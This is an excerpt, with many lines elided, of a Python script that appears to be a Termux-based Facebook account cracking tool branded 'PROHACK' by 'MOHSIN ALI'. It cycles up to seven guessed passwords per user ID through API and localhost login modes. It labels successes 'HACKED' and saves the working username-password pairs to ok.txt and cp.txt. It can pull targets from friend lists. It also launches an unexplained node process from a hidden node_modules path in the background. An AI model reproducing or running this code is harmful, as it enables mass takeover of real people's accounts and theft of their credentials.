...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/112406476962548/posts/275437807326080/?app=fbl')
    else:
...
"""
try:
    my = requests.get("https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX")
...
if not os.path.isfile("/data/data/com.termux/files/home/PROHACK/...../node_modules/bytes/index.js"):
    ...
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("\033[1;97mCONTACT ME ON FACEBOOK TO CONTINUE\033[0;97m")
    os.system("xdg-open https://www.facebook.com/MOHSIN.ALI.ALL.HATERX.KA.PAPA.FEEL.THE.POWER ")
    time.sleep(10)
...
def method_menu():
    ...
    logo()
    print("")
    print("\t    \033[1;32mCRACKING MENU BY MOHSIN\033[0;97m")
    print("")
    print("\033[1;31m[1] API-MODE LOGIN")
    print("\033[1;33m[2] LOCALHOST-MODE LOGIN")
    print("")
    method_menu_select()
def method_menu_select():
    afza = raw_input("\033[1;32mChoose One Option >>> ")
    if afza =="1":
        b_menu()
    elif afza =="2":
        l_menu()
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            print(" \033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;31m[MOHSIN-ALI-CP] "+uid+" | "+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
...
def extract_dob():
    ...
    print("")
    print("\x1b[1;91m[1] Grab From Friend list")
...
def l_menu_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m[MOHSIN-HACKED] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m[MOHSIN-ALI-HACKED] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error"]:
																	print("\033[1;31m[MOHSIN-CP] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
